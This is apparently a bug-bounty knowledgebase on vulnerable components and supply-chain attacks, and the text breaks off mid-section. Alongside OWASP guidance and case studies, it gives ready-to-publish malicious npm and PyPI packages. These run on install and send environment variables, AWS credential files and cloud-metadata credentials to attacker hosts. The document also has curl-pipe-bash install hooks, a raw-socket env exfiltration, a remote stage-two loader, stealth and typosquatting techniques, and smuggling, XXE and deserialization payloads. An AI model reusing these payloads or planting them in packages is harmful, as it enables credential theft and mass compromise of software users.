# Vulnerable Components & Supply Chain Attack Knowledgebase

> **Research-grade markdown knowledgebase for advanced bug bounty hunting and black-box testing.**
> Compiled from PortSwigger Research, HackTricks, OWASP, ProjectDiscovery, and community resources.
> Last Updated: 2026-05-24

---

## Table of Contents

1. [Basics](#basics)
2. [Vulnerable Components Theory](#vulnerable-components-theory)
3. [Dependency Confusion Techniques](#dependency-confusion-techniques)
4. [Vulnerable Component Discovery](#vulnerable-component-discovery)
5. [CVE Hunting Workflows](#cve-hunting-workflows)
6. [npm/pypi Poisoning Techniques](#npmpypi-poisoning-techniques)
7. [Supply Chain Exploitation Chains](#supply-chain-exploitation-chains)
8. [Third-Party JavaScript Takeovers](#third-party-javascript-takeovers)
9. [Exposed Package Version Fingerprinting](#exposed-package-version-fingerprinting)
10. [Secret Leakage from Dependencies](#secret-leakage-from-dependencies)
11. [Malicious Package Techniques](#malicious-package-techniques)
12. [Cache Poisoning + Supply Chain Chains](#cache-poisoning--supply-chain-chains)
13. [Request Smuggling + Supply Chain Chains](#request-smuggling--supply-chain-chains)
14. [OAuth + Supply Chain Chains](#oauth--supply-chain-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [Detection Techniques](#detection-techniques)
28. [References](#references)

---

## Basics

### What Are Vulnerable Components?

Vulnerable and outdated components (OWASP A06:2021) refer to software dependencies, libraries, frameworks, and modules that contain known security flaws. These components are integrated into applications but may be outdated, misconfigured, or sourced from untrusted repositories.

### Key Concepts

| Concept | Description |
|---------|-------------|
| **SBOM** | Software Bill of Materials - inventory of all components |
| **SCA** | Software Composition Analysis - identifying third-party components |
| **Dependency Graph** | Tree of all transitive dependencies |
| **Version Pinning** | Locking dependency versions to prevent automatic updates |
| **Private Registry** | Internal package repository (e.g., Nexus, Artifactory, Verdaccio) |
| **Public Registry** | Official package repositories (npmjs, PyPI, Maven Central, RubyGems) |

### Why Components Are Vulnerable

1. **Outdated Versions**: Developers rarely update dependencies
2. **Transitive Dependencies**: Vulnerabilities in dependencies-of-dependencies
3. **Default Configurations**: Libraries shipped with insecure defaults
4. **Unmaintained Packages**: Abandoned projects with unpatched CVEs
5. **Registry Confusion**: Package managers resolving to wrong sources
6. **Malicious Forks**: Typosquatting and malicious packages in public registries

---

## Vulnerable Components Theory

### OWASP A06:2021 - Vulnerable and Outdated Components

**Risk Factors:**
- If you do not know the versions of all components you use
- If software is vulnerable, unsupported, or out of date
- If you do not scan for vulnerabilities regularly
- If you do not fix or upgrade underlying frameworks and dependencies
- If software developers do not test compatibility of updated libraries

**Prevention:**
- Remove unused dependencies
- Continuously inventory versions of client-side and server-side components
- Monitor sources like CVE and NVD for vulnerabilities
- Obtain components only from official sources over secure links
- Maintain an SBOM

### Attack Surface Expansion

```
Application Code (your control)
    ↓
Direct Dependencies (package.json, requirements.txt)
    ↓
Transitive Dependencies (dependencies of dependencies)
    ↓
Build Tools & Plugins (webpack, babel, maven plugins)
    ↓
CI/CD Pipeline Components (GitHub Actions, Jenkins plugins)
    ↓
Container Base Images (Docker layers)
    ↓
Runtime Environment (Node.js, Python, JVM versions)
```

### Supply Chain Attack Vectors

```
[Developer Machine] → [Source Code] → [Build System] → [Artifact Registry] → [Deployment] → [Runtime]
       ↑                  ↑                ↑                  ↑                  ↑           ↑
   Malicious IDE    Backdoored       Compromised      Poisoned           Stolen      Runtime
   extensions       dependency       build tool       container          deploy      secret
                    (typosquat)      (SolarWinds)     image              keys        exfiltration
```

---

## Dependency Confusion Techniques

### Core Concept

Dependency confusion occurs when a package manager cannot distinguish between a private internal package and a public package with the same name. The package manager's resolution logic may favor the public registry package (often with a higher version number), causing the application to install a malicious package instead of the intended internal one.

### How Package Managers Resolve Packages

**npm:**
- Reads `package.json` dependencies
- Checks `.npmrc` for registry configuration
- Falls back to `registry.npmjs.org` if not found in private registry
- Higher version numbers take precedence when both exist

**pip (Python):**
- Reads `requirements.txt` or `pyproject.toml`
- Uses `--index-url` or `--extra-index-url`
- Fetches from the index with the higher version by default
- No namespace isolation between indexes

**Maven:**
- Uses `pom.xml` with `<repositories>` configuration
- Checks repositories in declared order
- First match wins (not highest version)

**RubyGems:**
- Uses `Gemfile` with `source` directives
- Checks sources in order
- Higher version from any source wins

### Discovery Methodology

```bash
# Step 1: Find internal package names from public sources
grep -r "require\|import" --include="*.js" . | grep -v node_modules
grep -r "from\|import" --include="*.ts" . | grep -v node_modules

# Step 2: Check package.json for private/unpublished packages
cat package.json | jq '.dependencies, .devDependencies'

# Step 3: Verify if package exists on public registry
npm view <private-package-name>
pip index versions <private-package-name>

# Step 4: Check for scope confusion (@company/package without registry mapping)
cat .npmrc
cat .yarnrc
```

### Exploitation Payloads

#### npm Dependency Confusion Payload

```javascript
// index.js - Malicious package entry point
const https = require('https');
const os = require('os');
const path = require('path');
const fs = require('fs');

// Collect environment and system info
const data = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    uid: os.userInfo().uid,
    cwd: process.cwd(),
    env: process.env,
    package_path: __dirname
};

// Exfiltrate to attacker server
const payload = JSON.stringify(data);
const options = {
    hostname: 'attacker.oastify.com',
    port: 443,
    path: '/exfil',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': payload.length,
        'X-Host': os.hostname(),
        'X-User': os.userInfo().username,
        'X-UID': os.userInfo().uid,
        'X-CWD': process.cwd()
    }
};

const req = https.request(options, (res) => {
    res.on('data', () => {});
});
req.write(payload);
req.end();

// Also try to read AWS credentials if present
try {
    const awsCreds = fs.readFileSync(path.join(os.homedir(), '.aws/credentials'), 'utf8');
    const awsConfig = fs.readFileSync(path.join(os.homedir(), '.aws/config'), 'utf8');
    // Exfiltrate AWS credentials
    https.get(`https://attacker.oastify.com/aws?creds=${Buffer.from(awsCreds).toString('base64')}`);
} catch(e) {}

// Try IMDSv2 metadata extraction
try {
    const tokenReq = https.request({
        hostname: '169.254.169.254',
        path: '/latest/api/token',
        method: 'PUT',
        headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
    }, (res) => {
        let token = '';
        res.on('data', chunk => token += chunk);
        res.on('end', () => {
            https.get({
                hostname: '169.254.169.254',
                path: '/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/',
                headers: { 'X-aws-ec2-metadata-token': token }
            }, (res2) => {
                let data = '';
                res2.on('data', chunk => data += chunk);
                res2.on('end', () => {
                    https.get(`https://attacker.oastify.com/imds?data=${Buffer.from(data).toString('base64')}`);
                });
            });
        });
    });
    tokenReq.end();
} catch(e) {}

// Normal module export to avoid suspicion
module.exports = {};
```

#### package.json for Malicious npm Package

```json
{
  "name": "production-x-company-internal1",
  "version": "99.0.0",
  "description": "Internal utility package",
  "main": "index.js",
  "scripts": {
    "preinstall": "node index.js",
    "postinstall": "node index.js"
  },
  "keywords": ["internal", "utility"],
  "author": "dev@company.com",
  "license": "MIT"
}
```

#### PyPI Dependency Confusion Payload

```python
# setup.py for malicious PyPI package
from setuptools import setup
import os
import socket
import urllib.request
import json

# Exfiltration during installation
def exfiltrate():
    try:
        data = {
            "hostname": socket.gethostname(),
            "user": os.getenv("USER") or os.getenv("USERNAME"),
            "cwd": os.getcwd(),
            "env": dict(os.environ)
        }
        req = urllib.request.Request(
            "https://attacker.oastify.com/exfil",
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# Run on import
exfiltrate()

setup(
    name="company-internal-utils",
    version="99.0.0",
    description="Internal utilities",
    py_modules=["company_internal_utils"],
    install_requires=[],
    python_requires=">=3.6",
)
```

#### Multi-Stage Malware via Dependencies (PyPI)

```python
# termncolor/__init__.py - Real-world pattern from 2025 attacks
import subprocess
import sys
import os

def _load_payload():
    """Load second-stage via DLL side-loading"""
    try:
        import colorinal  # Malicious dependency
        # colorinal loads rogue DLL via side-loading
        # DLL decrypts and executes next stage
        # Communicates with C2 via Zulip chat API
        # Persists via Windows Registry Run key
    except ImportError:
        pass

_load_payload()
```

### Version Number Strategy

```bash
# Always use a version higher than the internal package
# Check internal version first, then publish higher

# Strategy 1: Semantic version bump
# Internal: 1.2.3 → Publish: 99.0.0

# Strategy 2: Prerelease version (may bypass some checks)
# Publish: 1.2.4-alpha.99

# Strategy 3: Build metadata abuse
# Publish: 1.2.3+9999
```

### Scope Confusion (@scope/package)

```bash
# If company uses @company/internal-package
# But .npmrc doesn't map @company scope to private registry:

# .npmrc (VULNERABLE - missing scope mapping)
registry=https://registry.npmjs.org/
@company:registry=https://private.registry.com

# If the @company:registry line is missing:
# npm will check registry.npmjs.org for @company/package
# Attacker can publish @company/internal-package to npm
```

---

## Vulnerable Component Discovery

### Manual Discovery Techniques

#### 1. Technology Fingerprinting

```bash
# Wappalyzer browser extension
# BuiltWith (builtwith.com)
# WhatWeb CLI tool

whatweb -a 3 https://target.com

# Look for:
# - JavaScript frameworks (React, Vue, Angular versions)
# - Server software (Apache, Nginx, IIS versions)
# - CMS (WordPress, Drupal, Joomla versions)
# - Programming language versions
```

#### 2. HTTP Header Analysis

```bash
# Check Server, X-Powered-By, X-AspNet-Version headers
curl -I https://target.com

# Look for:
# Server: nginx/1.14.0  (CVE-2021-23017, CVE-2022-41741)
# X-Powered-By: PHP/7.4.3 (CVE-2022-31625)
# X-AspNet-Version: 4.0.30319
```

#### 3. JavaScript Source Analysis

```bash
# Extract and analyze JS files
# Look for version strings, library references

grep -r "version" --include="*.js" .
grep -r "webpackJsonp\|__webpack_require__" --include="*.js" .
grep -r "jquery\|react\|vue\|angular" --include="*.js" .

# Check for source maps
# target.com/static/app.js.map
# May reveal full source tree and dependencies
```

#### 4. Error Message Leakage

```bash
# Trigger errors to leak stack traces
curl "https://target.com/api/endpoint?param=<script>"

# Look for:
# - Framework names and versions in stack traces
# - File paths revealing technology stack
# - Internal package names
```

#### 5. Favicon Hashing (for framework identification)

```bash
# Get favicon and compute MMH3 hash
curl -s -o favicon.ico https://target.com/favicon.ico
python3 -c "import mmh3; import base64; print(mmh3.hash(base64.encodebytes(open('favicon.ico','rb').read()))"

# Search hash on Shodan or favicon databases
```

#### 6. CSS/Asset Path Analysis

```bash
# Framework-specific paths:
# /wp-content/ → WordPress
# /static/admin/ → Django
# /_next/static/ → Next.js
# /assets/webpack/ → Rails/Webpacker
```

### Automated Discovery

```bash
# Nuclei for tech detection
nuclei -u https://target.com -t http/technologies/

# Nuclei for exposed panels
nuclei -u https://target.com -t http/exposures/

# Nikto for comprehensive scanning
nikto -h https://target.com

# VulnX for CMS scanning
python3 vulnx.py -u https://target.com
```

### Dependency File Exposure

```bash
# Check for exposed dependency files:
# package.json
# package-lock.json
# yarn.lock
# requirements.txt
# Pipfile
# Pipfile.lock
# pom.xml
# build.gradle
# Gemfile
# Gemfile.lock
# composer.json
# composer.lock
# Cargo.toml
# Cargo.lock
# go.mod
# go.sum

curl https://target.com/package.json
curl https://target.com/requirements.txt
curl https://target.com/composer.lock
```

---

## CVE Hunting Workflows

### CVE-to-Exploit Workflow

```
1. IDENTIFY → Find component and version
2. RESEARCH → Search CVE databases for known vulnerabilities
3. VERIFY → Confirm the vulnerable code path exists
4. EXPLOIT → Adapt public PoC or craft custom exploit
5. IMPACT → Determine actual business impact
```

### CVE Research Sources

| Source | URL | Purpose |
|--------|-----|---------|
| NVD | nvd.nist.gov | Official CVE database |
| CVE Details | cvedetails.com | Version-specific CVE lookup |
| Exploit-DB | exploit-db.com | Public exploits |
| GitHub Security Advisories | github.com/advisories | Dependency-specific advisories |
| Snyk VulnDB | security.snyk.io | Detailed vulnerability info |
| OSV | osv.dev | Open Source Vulnerabilities |
| VulDB | vuldb.com | Comprehensive vulnerability DB |

### CVE Hunting Commands

```bash
# Search for CVEs by product and version
# Using searchsploit
searchsploit nginx 1.14

# Using nuclei CVE templates
nuclei -u https://target.com -t cves/2021/CVE-2021-23017.yaml

# Check if specific CVE affects target version
# Example: Log4j (CVE-2021-44228)
# Check for log4j in dependencies
find . -name "*.jar" -exec jar tf {} \; | grep -i log4j
grep -r "log4j" pom.xml build.gradle

# Check for Spring4Shell (CVE-2022-22965)
# Look for Spring Framework versions
grep -r "spring-core\|spring-webmvc" pom.xml
```

### Version Comparison Logic

```python
# Python script to check if version is vulnerable
from packaging import version

def is_vulnerable(current_version, vulnerable_range):
    """
    Check if current_version falls within vulnerable_range
    vulnerable_range format: ">=1.0.0,<1.2.3" or "==1.2.3"
    """
    current = version.parse(current_version)

    # Parse range
    conditions = vulnerable_range.split(',')
    for cond in conditions:
        cond = cond.strip()
        if cond.startswith('>='):
            if not (current >= version.parse(cond[2:])):
                return False
        elif cond.startswith('>'):
            if not (current > version.parse(cond[1:])):
                return False
        elif cond.startswith('<='):
            if not (current <= version.parse(cond[2:])):
                return False
        elif cond.startswith('<'):
            if not (current < version.parse(cond[1:])):
                return False
        elif cond.startswith('=='):
            if not (current == version.parse(cond[2:])):
                return False
    return True

# Example
print(is_vulnerable("1.2.2", ">=1.0.0,<1.2.3"))  # True
print(is_vulnerable("1.2.3", ">=1.0.0,<1.2.3"))  # False
```

### KEV (Known Exploited Vulnerabilities) Priority

```bash
# CISA KEV Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
# Prioritize CVEs in KEV for bug bounty

# Fetch KEV list
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json |     jq '.vulnerabilities[] | select(.cveID | contains("CVE-2025")) | .cveID'
```

---

## npm/pypi Poisoning Techniques

### npm Poisoning Vectors

#### 1. Install Scripts Abuse

```json
{
  "scripts": {
    "preinstall": "curl attacker.com | bash",
    "install": "node exploit.js",
    "postinstall": "node exploit.js"
  }
}
```

#### 2. Binary/Binding Compilation

```json
{
  "gypfile": true,
  "scripts": {
    "install": "node-gyp rebuild"
  }
}
```

```cpp
// binding.gyp - compiles native module with malicious code
{
  "targets": [
    {
      "target_name": "addon",
      "sources": [ "addon.cc" ]
    }
  ]
}
```

#### 3. TypeScript Definition Poisoning

```typescript
// index.d.ts - Malicious type definitions
// Can be used to inject code via type manipulation
declare module "legitimate-package" {
    // Override types to enable injection
}
```

### PyPI Poisoning Vectors

#### 1. setup.py Code Execution

```python
from setuptools import setup
import os

# Code runs during pip install
os.system("curl https://attacker.com/shell | bash")

setup(
    name="legitimate-looking-package",
    version="1.0.0",
)
```

#### 2. Wheel File Manipulation

```bash
# Extract wheel
unzip package.whl -d package_extracted/

# Inject malicious code into compiled .pyc or .so files
# Repack wheel
zip -r package_modified.whl package_extracted/
```

#### 3. Requirements.txt Injection

```
# Malicious requirements.txt
legitimate-package==1.0.0
malicious-dependency>=99.0.0  # Added by attacker
```

### Typosquatting Strategies

```
Popular Package    Typosquatting Variants
-------------      ----------------------
requests           reqeusts, request, requets
django             dajngo, djangoo, djanog
flask              flsk, flassk, flast
numpy              numy, nump, nummpy
 pandas            pands, pandasz, pandass
```

### Brandjacking

```bash
# Register abandoned package names
# Check for packages with similar names to internal tools

# Example: Company has internal package "acme-utils"
# Attacker registers "acme_utils" or "acmeutils" on PyPI/npm
```

---

## Supply Chain Exploitation Chains

### Chain 1: Dependency Confusion → Secret Exfiltration → Cloud Takeover

```
1. Identify internal package name from public repo/package.json
2. Publish malicious package with higher version to public registry
3. CI/CD pipeline installs malicious package
4. Malicious package exfiltrates:
   - Environment variables
   - AWS/GCP/Azure credentials
   - .npmrc/.pypirc tokens
   - GitHub tokens (GITHUB_TOKEN)
5. Use stolen credentials for cloud resource access
```

### Chain 2: Vulnerable Dependency → RCE → Container Escape

```
1. Identify outdated dependency with known RCE (e.g., Log4j)
2. Trigger vulnerable code path via user input
3. Achieve RCE in application container
4. Exploit container misconfiguration for host escape
5. Access other containers and cluster resources
```

### Chain 3: Malicious Package → Build Poisoning → Artifact Tampering

```
1. Compromise developer machine or CI/CD
2. Inject malicious build step or dependency
3. Poisoned build artifacts deployed to production
4. Backdoored application serves malicious content
```

### Chain 4: Exposed Registry → Package Tampering → Mass Compromise

```
1. Find exposed private npm/PyPI registry (no auth)
2. Upload modified version of existing package
3. All consumers of the registry get poisoned package
4. Mass compromise of all dependent applications
```

---

## Third-Party JavaScript Takeovers

### Subdomain Takeover → JS Hijacking

```
1. Identify third-party JS loaded by target: <script src="https://cdn.thirdparty.com/lib.js">
2. Check if thirdparty.com subdomain is vulnerable to takeover
3. Take over subdomain or compromise third-party account
4. Modify lib.js to include malicious code
5. All target users execute attacker-controlled JS
```

### CDN / S3 Bucket Takeover for JS

```bash
# Check if JS assets are loaded from S3/CDN with vulnerable bucket
# Look for 404/NoSuchBucket errors

curl -I https://s3.amazonaws.com/company-assets-cdn/script.js
# HTTP/1.1 404 Not Found
# x-amz-error-code: NoSuchBucket

# If bucket doesn't exist, create it and upload malicious JS
aws s3 mb s3://company-assets-cdn
aws s3 cp malicious.js s3://company-assets-cdn/script.js
```

### postMessage-Based JS Hijacking

```javascript
// If target loads third-party JS that uses postMessage
// And doesn't validate origin properly

// Attacker page:
const target = window.open('https://target.com/widget');
target.postMessage({
    action: 'loadScript',
    url: 'https://attacker.com/malicious.js'
}, '*');
```

---

## Exposed Package Version Fingerprinting

### Techniques to Extract Exact Versions

#### 1. package.json Exposure

```bash
curl https://target.com/package.json | jq '.'
curl https://target.com/static/package.json
curl https://target.com/assets/package.json
```

#### 2. Source Map Analysis

```bash
# Download source map
curl -O https://target.com/static/app.js.map

# Parse source map for dependency info
# Look for webpack module identifiers containing version strings
```

#### 3. CSS/JS File Hash Analysis

```bash
# Frameworks include version in file hashes or paths
# /static/react@18.2.0/react.production.min.js
# /assets/vue-3.3.4/vue.global.js
```

#### 4. Error Stack Trace Leakage

```bash
# Trigger JS errors to get stack traces
curl "https://target.com/api?callback=<invalid>"

# Stack trace reveals:
# at Object.<anonymous> (/app/node_modules/express@4.18.2/lib/router/index.js:...)
```

#### 5. npm Package Metadata Endpoints

```bash
# Some registries expose metadata
# npm registry API (if proxy misconfigured)
curl https://registry.npmjs.org/package-name
```

#### 6. Dependency Lock Files

```bash
# Exposed lock files reveal exact versions
curl https://target.com/package-lock.json
curl https://target.com/yarn.lock
curl https://target.com/Pipfile.lock
curl https://target.com/composer.lock
```

---

## Secret Leakage from Dependencies

### Common Secrets Found in Dependencies

1. **API Keys** in test files or config
2. **Database Credentials** in migration scripts
3. **AWS/GCP/Azure Keys** in deployment configs
4. **Private Keys** in certificate files
5. **Internal URLs** pointing to staging/prod
6. **Auth Tokens** in CI/CD configs

### Secret Hunting in Dependencies

```bash
# Using TruffleHog on node_modules
trufflehog filesystem ./node_modules --results=verified,unknown

# Using Gitleaks
gitleaks detect --source ./node_modules --verbose

# Manual grep patterns
grep -r "AKIA[0-9A-Z]{16}" ./node_modules  # AWS Access Key
grep -r "ghp_[a-zA-Z0-9]{36}" ./node_modules  # GitHub PAT
grep -r "sk-[a-zA-Z0-9]{48}" ./node_modules  # OpenAI API Key
grep -r "xox[baprs]-[0-9a-zA-Z]{10,48}" ./node_modules  # Slack Token
grep -r "private_key\|-----BEGIN RSA PRIVATE KEY-----" ./node_modules
```

### .npmrc / .pypirc Token Extraction

```bash
# If dependency installation runs in CI, tokens may be in env
grep -r "_authToken\|//registry.npmjs.org/:_authToken" ~/.npmrc
grep -r "password\|username" ~/.pypirc
```

---

## Malicious Package Techniques

### Stealth Techniques

#### 1. Delayed Execution

```javascript
// index.js
module.exports = {
    // Normal functionality
    helper: function() { return true; }
};

// Delayed payload - runs after 7 days
setTimeout(() => {
    require('./payload.js');
}, 7 * 24 * 60 * 60 * 1000);
```

#### 2. Environment-Based Activation

```javascript
// Only activate in production-like environments
if (process.env.NODE_ENV === 'production' || 
    process.env.CI === 'true' ||
    process.env.AWS_EXECUTION_ENV) {
    require('./payload.js');
}
```

#### 3. Legitimate Functionality with Hidden Payload

```javascript
// Main export - completely legitimate
module.exports = function cleanInput(input) {
    return input.trim().toLowerCase();
};

// Side effect - hidden data collection
const net = require('net');
const client = net.createConnection({ port: 1337, host: 'attacker.com' });
client.write(JSON.stringify(process.env));
```

#### 4. Minified/Obfuscated Code

```javascript
// Publish heavily obfuscated code
// Makes detection difficult
// Use javascript-obfuscator or similar
```

### Multi-Stage Payloads

```python
# Stage 1: Innocuous package
# Stage 2: Download additional payload from C2
# Stage 3: Execute final payload

import urllib.request
import base64
import subprocess

# Download stage 2
stage2 = urllib.request.urlopen("https://attacker.com/stage2").read()
# Decode and execute
decoded = base64.b64decode(stage2)
exec(decoded)
```

---

## Cache Poisoning + Supply Chain Chains

### Web Cache Poisoning via Unkeyed Headers

```bash
# Identify unkeyed inputs using Param Miner
# Or manual testing with cache-buster

# Test header reflection
curl -H "X-Forwarded-Host: attacker.com"      "https://target.com/page?cb=12345"

# If reflected in response and cacheable:
# Poison cache to serve malicious JS/CSS
```

### Cache Poisoning for JS Hijacking

```bash
# Poison cache entry for static JS file
# Target: X-Forwarded-Host or similar unkeyed header

# Step 1: Confirm cache behavior
curl -I "https://target.com/static/app.js?cb=1"
# Check CF-Cache-Status, Age, X-Cache headers

# Step 2: Poison with redirect
curl -H "X-Forwarded-Host: attacker.com"      "https://target.com/static/app.js?cb=1"

# Step 3: Victims loading app.js get redirected to attacker's JS
```

### Cache Key Injection

```bash
# Some caches include unexpected headers in cache key
# Exploit to create cache partitions

curl -H "X-HTTP-Method-Override: POST"      "https://target.com/api/data"
```

---

## Request Smuggling + Supply Chain Chains

### CL.0 Desync for Single-Server Targets

```http
POST /static/file.css HTTP/1.1
Host: target.com
Content-Length: 41

GET /malicious HTTP/1.1
Host: attacker.com
X: 
```

### Browser-Powered Desync (CSD)

```javascript
// Client-Side Desync attack via browser
// Target ignores Content-Length on POST to static files

fetch('https://target.com/favicon.ico', {
    method: 'POST',
    body: "GET /admin HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'
});
```

### Request Smuggling → Cache Poisoning Chain

```
1. Smuggle request to poison backend response
2. Poisoned response gets cached by CDN
3. All users receive malicious response
```

### H2.TE Desync via HTTP/2 Downgrade

```http
# HTTP/2 request that gets downgraded to HTTP/1.1
:method POST
:path /
:authority target.com
content-length 0

# Body contains smuggled request after downgrade
# Front-end sees HTTP/2 length (0)
# Back-end sees Transfer-Encoding: chunked (injected during downgrade)
```

---

## OAuth + Supply Chain Chains

### OAuth Flow with Vulnerable Dependencies

```
1. Target uses vulnerable OAuth library (e.g., old passport-oauth)
2. Identify CVE in OAuth implementation
3. Exploit to bypass state validation or steal tokens
4. Use stolen tokens to access user data or perform actions
```

### OAuth Library Version Fingerprinting

```bash
# Check for OAuth library versions in JS bundles
grep -r "passport\|oauth\|oidc" --include="*.js" .

# Check for known vulnerable OAuth endpoints
# /.well-known/openid-configuration
# /oauth/authorize
# /oauth/token
```

### OAuth State Parameter Bypass via Dependency

```javascript
// Vulnerable OAuth library doesn't validate state properly
// Attacker can fixate state or bypass check entirely

// Exploit:
// 1. Start OAuth flow, capture state parameter
// 2. Force victim to complete OAuth with attacker's state
// 3. Victim's account linked to attacker's OAuth identity
```

---

## Parser Confusion Payloads

### HTTP Header Parser Discrepancies

#### Transfer-Encoding Obfuscation

```http
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding:	chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
 Transfer-Encoding: chunked
Transfer-Encoding : chunked
X-Transfer-Encoding: chunked
```

#### Content-Length Manipulation

```http
Content-Length: 0
Content-Length: 0
Content-Length: 41
Content-Length:	41
Content-Length: 41
Content-Length: 0
 Content-Length: 41
```

#### Host Header Confusion

```http
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
Host: target.com
Host: attacker.com
```

### JSON Parser Confusion

```json
// Different parsers handle duplicate keys differently
{
    "is_admin": false,
    "is_admin": true
}

// Some parsers use last value, others first
```

### XML Parser Confusion

```xml
<!-- XXE via DTD -->
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Parameter entity for blind XXE -->
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://attacker.com/dtd">
%xxe;
]>
```

---

## Browser Quirks

### about:blank Origin Inheritance

```javascript
// When a cross-domain iframe is set to about:blank
// Chrome allows the parent to access it
// This bypasses CSP and same-origin policy

const iframe = document.createElement('iframe');
iframe.src = 'https://victim.com/page';
document.body.appendChild(iframe);

// Later:
iframe.contentWindow.location = 'about:blank';
// Now attacker can read/write iframe content
setTimeout(() => {
    alert(iframe.contentWindow.document.body.innerHTML);
}, 500);
```

### null Origin Bypass

```javascript
// Sandboxed iframe creates null origin
// Both e.origin and window.origin become 'null'
// Bypasses e.origin === window.origin checks

const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
<script>
const w = window.open('https://victim.com');
setTimeout(() => {
    w.postMessage('exploit', '*');
}, 1000);
<\/script>
`;
document.body.appendChild(frame);
```

### event.source Nullification

```javascript
// Make event.source null by removing iframe immediately
function postMessageNoSource(targetWindow, data) {
    window._target = targetWindow;
    window._data = data;

    const iframe = document.createElement('iframe');
    iframe.srcdoc = `
        <script>
        top._target.postMessage(top._data, '*');
        <\/script>
    `;
    document.body.appendChild(iframe);

    // Remove immediately - source becomes null
    setTimeout(() => iframe.remove(), 0);
}
```

### Connection Pool Poisoning

```javascript
// Chrome has separate connection pools for:
// - with-cookies requests
// - without-cookies requests

// Always poison the with-cookies pool:
fetch('https://target.com/', {
    credentials: 'include',  // Important!
    mode: 'no-cors'
});
```

---

## Gadget Chains

### Client-Side Prototype Pollution Gadgets

#### jQuery $.ajax URL Gadget

```javascript
// Pollute url property to control request destination
// ?__proto__[url]=//attacker.com

// jQuery internally does:
// options.url = ...
// If options.__proto__.url is set, it inherits

// Result: $.ajax requests go to attacker.com
```

#### lodash _.defaultsDeep RCE Gadget

```javascript
// Via prototype pollution:
// ?__proto__[constructor][prototype][shell]=node&__proto__[constructor][prototype][shell]=-e&__proto__[constructor][prototype][shell]=require('child_process').exec('calc')
```

#### Express.js qs Parser Gadget

```javascript
// Express uses qs to parse query strings
// qs merges objects recursively

// Payload:
// ?constructor[prototype][polluted]=true

// Result: Object.prototype.polluted = true
```

### Server-Side Gadget Chains

#### Java Deserialization (ysoserial)

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com'

# Common gadget chains:
# CommonsCollections1-7
# Spring1, Spring2
# Hibernate1
# JBossInterceptors1
# JSON1 (via Jackson/Gson)
```

#### .NET Deserialization (ysoserial.net)

```bash
# Generate payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc"

# Gadgets:
# ActivitySurrogateSelector
# ObjectDataProvider
# PSObject
# TypeConfuseDelegate
# WindowsIdentity
```

#### PHP Deserialization (PHPGGC)

```bash
# Generate payload
phpggc Laravel/RCE1 system "id"

# Frameworks:
# Laravel
# Symfony
# Zend
# Monolog
# Doctrine
```

---

## Real World Case Studies

### Case Study 1: Alex Birsan's Dependency Confusion (2021)

**Target:** 35+ major tech companies (Microsoft, Apple, Netflix, Tesla, Uber)
**Bounty:** $130,000+
**Technique:** Dependency confusion across npm, PyPI, RubyGems

**Method:**
1. Found internal package names from public GitHub repos
2. Published packages with same names to public registries
3. Packages had higher versions than internal ones
4. CI/CD pipelines automatically installed malicious packages
5. Exfiltrated environment variables and system info

**Key Takeaway:** Internal package names leaked in public repos are critical attack vectors.

### Case Study 2: PyTorch Supply Chain Attack (2022)

**Target:** PyTorch nightly builds
**Technique:** Dependency confusion via `torchtriton` package
**Impact:** Stole SSH keys, system info, environment variables

**Method:**
1. PyTorch depended on `torchtriton` package
2. Attacker published malicious `torchtriton` to PyPI
3. pip installed malicious version due to higher version number
4. Malicious code executed during installation

### Case Study 3: PortSwigger Browser-Powered Desync

**Researcher:** James Kettle
**Technique:** Client-Side Desync (CSD)
**Impact:** Single-server request smuggling via browser

**Key Findings:**
- POST requests to static files often ignore Content-Length
- Browsers can be used to poison connection pools
- Enables attacks on sites without reverse proxies
- Affected Akamai, Cisco Web VPN, Pulse Secure, Verisign

### Case Study 4: PortSwigger Web Cache Poisoning

**Researcher:** James Kettle
**Impact:** XSS, cookie hijacking, route poisoning across major sites

**Targets:**
- Red Hat (X-Forwarded-Host XSS via cache)
- Unity3D (X-Host script injection)
- Mozilla SHIELD (Firefox extension system hijacking)
- Cloudflare Blog (Ghost platform route poisoning)
- data.gov (DOM-based translation poisoning)

### Case Study 5: HTTP/1 Must Die (2025)

**Researcher:** James Kettle
**Impact:** 20+ million websites via Cloudflare internal desync

**Key Techniques:**
- Parser discrepancy detection via HTTP Request Smuggler v3.0
- 0.CL desync attacks via Expect header
- Double-desync for converting 0.CL to CL.0
- Early-response gadgets (/con, /nul on Windows)

---

## Fuzzing Payloads

### Dependency Name Fuzzing

```bash
# Generate typosquatting variants
# Using dnsgen or similar

dnsgen popular-packages.txt -w wordlist.txt > typos.txt

# Common patterns:
# - Character omission: requests → reqests
# - Character swap: django → dajngo
# - Character duplication: flask → flassk
# - Homoglyphs: numpy → numрy (Cyrillic р)
```

### Version Fuzzing

```bash
# Test for version-based bypasses
# Old versions with known CVEs

# npm
npm install package@1.0.0  # Test old version

# pip
